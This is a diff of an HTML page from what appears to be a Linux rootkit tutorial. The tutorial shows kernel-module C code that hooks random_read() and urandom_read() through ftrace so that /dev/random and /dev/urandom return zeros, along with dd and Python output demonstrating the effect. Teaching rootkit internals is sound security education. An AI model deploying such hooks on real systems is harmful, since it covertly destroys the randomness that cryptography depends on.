@@ -182,14 +182,14 @@ Char Devices in Linux Although you might not recognise the name, you&amp;rsquo;r
 <h1 id="char-devices-in-linux">Char Devices in Linux<a href="#char-devices-in-linux" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
 <p>Although you might not recognise the name, you&rsquo;re probably already pretty familiar with a bunch of <em>char</em> (or <em>char</em>aracter) devices already. They usually live under <code>/dev/</code> and their source code can be found in <a href="https://github.com/torvalds/linux/tree/master/drivers/char"><code>drivers/char</code></a>. Perhaps the most common ones are <code>random</code> and <code>urandom</code> which are the two that we are going to be targetting a little later on.</p>
 <p>Essentially, a char device is some functionality of the kernel where it makes sense to expose it to the user as a <em>file</em>. This is particularly clear with things like <code>random</code> and <code>urandom</code> - if we want the kernel to give us some random bytes then we just read from either of these (normally using <code>dd</code>).</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ dd <span style="color:#66d9ef">if</span><span style="color:#f92672">=</span>/dev/random bs<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span> count<span style="color:#f92672">=</span><span style="color:#ae81ff">32</span> | xxd
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ dd <span style="color:#66d9ef">if</span><span style="color:#f92672">=</span>/dev/random bs<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span> count<span style="color:#f92672">=</span><span style="color:#ae81ff">32</span> | xxd
 00000000: a1ec bdbd 638c dabd 4c04 e018 9cc0 <span style="color:#ae81ff">0993</span>  ....c...L.......
 00000010: 50e1 b686 <span style="color:#ae81ff">8997</span> <span style="color:#ae81ff">3572</span> c0ec d05c d799 <span style="color:#ae81ff">9103</span>  P.....5r...<span style="color:#ae81ff">\.</span>...
 32+0 records in
 32+0 records out
 <span style="color:#ae81ff">32</span> bytes copied, 0.000535243 s, 59.8 kB/s
 </code></pre></div><p>Don&rsquo;t be decieved into thinking that it&rsquo;s a real file! If you mounted your harddrive on another machine you <em>would not</em> find any of these char devices. Taking a look at <code>random</code> with <code>file</code>, we see:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ file /dev/random
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ file /dev/random
 /dev/random: character special <span style="color:#f92672">(</span>1/8<span style="color:#f92672">)</span>
 </code></pre></div><p>This reinforces the fact we are not dealing with actual files - even if they behave like them!</p>
 <blockquote>
@@ -207,7 +207,7 @@ Char Devices in Linux Although you might not recognise the name, you&amp;rsquo;r
 <p>The other important thing to point out is that <code>sys_read</code> doesn&rsquo;t know what it&rsquo;s reading from - all it has is a file descriptor! If we wanted to manipulate reads to <code>random</code> and <code>urandom</code> using syscalls, we&rsquo;d have to hook both <code>sys_read</code> and <code>sys_open</code>. Then we&rsquo;d have to wait for something to try to <em>open</em> either of the char devices, log the file descriptor it returns somewhere and wait for something to <em>read</em> from it. In fact, we&rsquo;d also have to hook <code>sys_close</code> as well so we&rsquo;d know when to stop watching for a file descriptor too! Sounds complicated, right? Luckily we can hook more than just syscalls!</p>
 <h1 id="the-char-devices-read-routines">The char device&rsquo;s read routines<a href="#the-char-devices-read-routines" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
 <p>Let&rsquo;s take a look at <a href="https://github.com/torvalds/linux/blob/dd9fb9bb3340c791a2be106fdc895db75f177343/drivers/char/random.c#L1989"><code>drivers/char/random.c</code></a> where we have the following two snippets:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">const</span> <span style="color:#66d9ef">struct</span> file_operations random_fops <span style="color:#f92672">=</span> {
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">const</span> <span style="color:#66d9ef">struct</span> file_operations random_fops <span style="color:#f92672">=</span> {
     .read <span style="color:#f92672">=</span> random_read,
     .write <span style="color:#f92672">=</span> random_write,
     <span style="color:#75715e">/* trimmed for clarity */</span>
@@ -219,7 +219,7 @@ Char Devices in Linux Although you might not recognise the name, you&amp;rsquo;r
     <span style="color:#75715e">/* trimmed for clarity */</span>
 };
 </code></pre></div><p>This tells us that whenever something tries to read from <code>/dev/random</code> or <code>/dev/urandom</code>, the functions <code>random_read()</code> or <code>urandom_read()</code> are called respectively. Taking a look at one of these functions, <a href="https://github.com/torvalds/linux/blob/dd9fb9bb3340c791a2be106fdc895db75f177343/drivers/char/random.c#L1861">we find</a>:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">static</span> ssize_t
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">static</span> ssize_t
 <span style="color:#a6e22e">random_read</span>(<span style="color:#66d9ef">struct</span> file <span style="color:#f92672">*</span>file, <span style="color:#66d9ef">char</span> __user <span style="color:#f92672">*</span>buf, size_t nbytes, loff_t <span style="color:#f92672">*</span>ppos)
 {
     <span style="color:#66d9ef">int</span> ret;
@@ -234,16 +234,16 @@ Char Devices in Linux Although you might not recognise the name, you&amp;rsquo;r
 <h1 id="writing-the-rootkit">Writing the rootkit<a href="#writing-the-rootkit" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
 <p>We are going to be hooking both <code>random_read()</code> and <code>urandom_read()</code> which will allow us to make changes to the buffer containing the read data before returning to userspace.</p>
 <p>Whenever we want to hook a function with ftrace, we need to check that the symbol name is exported by the kernel. This is certainly the case for all the syscalls but, seeing as neither of our targets are in the syscall table, we&rsquo;d better check manually. As mentioned in earlier posts, this is done by looking at <code>/proc/kallsyms</code>:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ sudo cat /proc/kallsyms | grep random_read
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ sudo cat /proc/kallsyms | grep random_read
 /* redacted <span style="color:#66d9ef">for</span> clarity */
 ffffffff84c934a0 t random_read
 ffffffff84c934d0 t urandom_read
 </code></pre></div><p>Okay, all good. The first thing we need to do now is get our function declarations right for the <em>original</em> copies:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">static</span> asmlinkage <span style="color:#a6e22e">ssize_t</span> (<span style="color:#f92672">*</span>orig_random_read)(<span style="color:#66d9ef">struct</span> file <span style="color:#f92672">*</span>file, <span style="color:#66d9ef">char</span> __user <span style="color:#f92672">*</span>buf, size_t nbytes, loff_t <span style="color:#f92672">*</span>ppos);
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">static</span> asmlinkage <span style="color:#a6e22e">ssize_t</span> (<span style="color:#f92672">*</span>orig_random_read)(<span style="color:#66d9ef">struct</span> file <span style="color:#f92672">*</span>file, <span style="color:#66d9ef">char</span> __user <span style="color:#f92672">*</span>buf, size_t nbytes, loff_t <span style="color:#f92672">*</span>ppos);
 <span style="color:#66d9ef">static</span> asmlinkage <span style="color:#a6e22e">ssize_t</span> (<span style="color:#f92672">*</span>orig_urandom_read)(<span style="color:#66d9ef">struct</span> file <span style="color:#f92672">*</span>file, <span style="color:#66d9ef">char</span> __user <span style="color:#f92672">*</span>buf, size_t nbytes, loff_t <span style="color:#f92672">*</span>ppos);
 </code></pre></div><p>Now we get to writing the actual hook. I&rsquo;m only going to through the hook for <code>random_read()</code> because it is <em>identical</em> for <code>urandom_read()</code>, except we stick an extra <code>u</code> in. You&rsquo;ll see why this is the case as we work through it.</p>
 <p>Recall that <code>sys_read()</code> returns the number of bytes successfully read? Well, <code>random_read()</code> does exactly the same thing! The very first thing our hook does is call <code>orig_random_read()</code> with all the arguments it&rsquo;s supplied with. Roughly, we have:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">static</span> asmlinkage ssize_t <span style="color:#a6e22e">hook_random_read</span>(<span style="color:#66d9ef">struct</span> file <span style="color:#f92672">*</span>file, <span style="color:#66d9ef">char</span> __user <span style="color:#f92672">*</span>buf, size_t nbytes, loff_t <span style="color:#f92672">*</span>ppos)
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">static</span> asmlinkage ssize_t <span style="color:#a6e22e">hook_random_read</span>(<span style="color:#66d9ef">struct</span> file <span style="color:#f92672">*</span>file, <span style="color:#66d9ef">char</span> __user <span style="color:#f92672">*</span>buf, size_t nbytes, loff_t <span style="color:#f92672">*</span>ppos)
 {
     <span style="color:#66d9ef">int</span> bytes_read;
 
@@ -258,7 +258,7 @@ ffffffff84c934d0 t urandom_read
 <p>For simplicity, we are just going to fill the buffer with <code>0x00</code>. Unfortunately (or <em>fortunately</em>, depending on how you see it), this isn&rsquo;t as easy as it might sound. The reason is partly due to to the presence of the <code>__user</code> identifier for the buffer. This reminds the kernel (and us!) that <code>buf</code> points to <em>an address in userspace virtual memory</em>. We don&rsquo;t know where this virtual address maps to physically, so trying to perform a read or write operation will likely result in a segfault.</p>
 <p>The solution to this problem is to use the <code>copy_from_user()</code> and <code>copy_to_user()</code> functions, which allow us to copy data between arrays in both user- and kernel-space. For this module, we only really need <code>copy_to_user()</code>, but I&rsquo;m going to use both anyway to show you how they work.</p>
 <p>To get started, we need an array of our own in kernelspace. If you&rsquo;ve ever used <code>malloc()</code> in C then this will be very familiar to you. We use the function <code>kzalloc()</code>, which takes 2 arguments; a size and some flags. It then allocates a region of memory of the size we wanted and returns the address to us. When we are done with this buffer, we use <code>kfree()</code> tell the kernel that we no longer need that patch of memory. It looks something like this:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>kbuf <span style="color:#f92672">=</span> NULL;
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>kbuf <span style="color:#f92672">=</span> NULL;
 <span style="color:#66d9ef">int</span> buf_size <span style="color:#f92672">=</span> <span style="color:#ae81ff">32</span>;
 
 kbuf <span style="color:#f92672">=</span> kzalloc(buf_size, GFP_KERNEL);
@@ -270,7 +270,7 @@ kbuf <span style="color:#f92672">=</span> kzalloc(buf_size, GFP_KERNEL);
 kfree(kbuf);
 </code></pre></div><p>Pretty simple, right? The <code>GFP_KERNEL</code> flag indicates that this buffer is to be allocated in kernel memory - you can read more about the possible flags <a href="https://www.kernel.org/doc/htmldocs/kernel-api/API-kmalloc.html">here</a>.</p>
 <p>So, now we can use <code>copy_from_user()</code> to get the random bytes that were &ldquo;read&rdquo; from <code>/dev/random</code> (it&rsquo;s this step that we <em>could</em> skip because we only really need to copy the zero-filled buffer back to <code>buf</code>, but it&rsquo;ll be useful for later modules to see how this part works).</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">long</span> error;
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">long</span> error;
 
 error <span style="color:#f92672">=</span> copy_from_user(kbuf, buf, bytes_read);
 <span style="color:#66d9ef">if</span>(error)
@@ -282,7 +282,7 @@ error <span style="color:#f92672">=</span> copy_to_user(buf, kbuf, bytes_read);
 <span style="color:#66d9ef">if</span>(error)
     printk(KERN_ERROR <span style="color:#e6db74">&#34;failed to copy back to user space: %d</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, error);
 </code></pre></div><p>Putting it all together, we get the following hook:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">static</span> asmlinkage ssize_t <span style="color:#a6e22e">hook_random_read</span>(<span style="color:#66d9ef">struct</span> file <span style="color:#f92672">*</span>file, <span style="color:#66d9ef">char</span> __user <span style="color:#f92672">*</span>buf, size_t nbytes, loff_t <span style="color:#f92672">*</span>ppos)
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">static</span> asmlinkage ssize_t <span style="color:#a6e22e">hook_random_read</span>(<span style="color:#66d9ef">struct</span> file <span style="color:#f92672">*</span>file, <span style="color:#66d9ef">char</span> __user <span style="color:#f92672">*</span>buf, size_t nbytes, loff_t <span style="color:#f92672">*</span>ppos)
 {
     <span style="color:#66d9ef">int</span> bytes_read, i;
     <span style="color:#66d9ef">long</span> error;
@@ -324,7 +324,7 @@ error <span style="color:#f92672">=</span> copy_to_user(buf, kbuf, bytes_read);
 <p>Notice that we didn&rsquo;t have to worry about the whole doubling-up business with <code>pt_regs</code> structs like with the <code>sys_kill</code> hook in <a href="../linux_rootkits_03">Part 3</a>. This is because we aren&rsquo;t hooking a syscall in this rootkit - the way that a regular function is called by the kernel is unambiguous!</p>
 </blockquote>
 <p>Okay, if we go ahead and <code>make</code>, <code>insmod rootkit.ko</code>, etc, we can see what happens when we attempt to read from <code>/dev/random</code> or <code>/dev/urandom</code>:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ dd <span style="color:#66d9ef">if</span><span style="color:#f92672">=</span>/dev/random bs<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span> count<span style="color:#f92672">=</span><span style="color:#ae81ff">32</span> | xxd
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ dd <span style="color:#66d9ef">if</span><span style="color:#f92672">=</span>/dev/random bs<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span> count<span style="color:#f92672">=</span><span style="color:#ae81ff">32</span> | xxd
 00000000: <span style="color:#ae81ff">0000</span> <span style="color:#ae81ff">0000</span> <span style="color:#ae81ff">0000</span> <span style="color:#ae81ff">0000</span> <span style="color:#ae81ff">0000</span> <span style="color:#ae81ff">0000</span> <span style="color:#ae81ff">0000</span> <span style="color:#ae81ff">0000</span>  ................
 00000010: <span style="color:#ae81ff">0000</span> <span style="color:#ae81ff">0000</span> <span style="color:#ae81ff">0000</span> <span style="color:#ae81ff">0000</span> <span style="color:#ae81ff">0000</span> <span style="color:#ae81ff">0000</span> <span style="color:#ae81ff">0000</span> <span style="color:#ae81ff">0000</span>  ................
 32+0 records in
@@ -335,7 +335,7 @@ error <span style="color:#f92672">=</span> copy_to_user(buf, kbuf, bytes_read);
 <h1 id="where-can-we-go-with-this">Where can we go with this?<a href="#where-can-we-go-with-this" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
 <p>Obviously, not being able to obtain any random bytes seriously undermines the cryptographic security of the system. The most common way for a program in userspace to interface with these char devices is the <code>sys_getrandom()</code> syscall. As mentioned earlier, this syscall uses <code>/dev/urandom</code> by default (but can also use <code>/dev/random</code> if supplied with the <code>GRND_RANDOM</code> flag) so that hook in particular has a very wide ranging affect.</p>
 <p>Let&rsquo;s put together a quick-and-dirty python script to calculate some random numbers:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e">#!/usr/bin/python3</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e">#!/usr/bin/python3</span>
 
 <span style="color:#f92672">import</span> random
 
@@ -350,10 +350,10 @@ coinflips <span style="color:#f92672">=</span> []
         headcount <span style="color:#f92672">+=</span> <span style="color:#ae81ff">1</span>
     coinflips<span style="color:#f92672">.</span>append(newflip)
 
-<span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;Heads: &#34;</span> <span style="color:#f92672">+</span> str(headcount))
-<span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;Tails: &#34;</span> <span style="color:#f92672">+</span> str(SAMPLE_SIZE <span style="color:#f92672">-</span> headcount))
+print(<span style="color:#e6db74">&#34;Heads: &#34;</span> <span style="color:#f92672">+</span> str(headcount))
+print(<span style="color:#e6db74">&#34;Tails: &#34;</span> <span style="color:#f92672">+</span> str(SAMPLE_SIZE <span style="color:#f92672">-</span> headcount))
 </code></pre></div><p>Let&rsquo;s run this a few times and see what happens:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ ./check.py
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ ./check.py
 Heads: <span style="color:#ae81ff">515</span>
 Tails: <span style="color:#ae81ff">485</span>
 $ ./check.py
@@ -363,7 +363,7 @@ $ ./check.py
 Heads: <span style="color:#ae81ff">515</span>
 Tails: <span style="color:#ae81ff">485</span>
 </code></pre></div><p>I think you get the idea&hellip; We have dramatically reduced the randomness available (in the case of this particular statistic, we&rsquo;ve reduced it to zero!). Just for comparison, let&rsquo;s see what happens if we run that Python script again after unloading the rootkit:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ ./check.py
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ ./check.py
 Heads: <span style="color:#ae81ff">483</span>
 Tails: <span style="color:#ae81ff">517</span>
 $ ./check.py
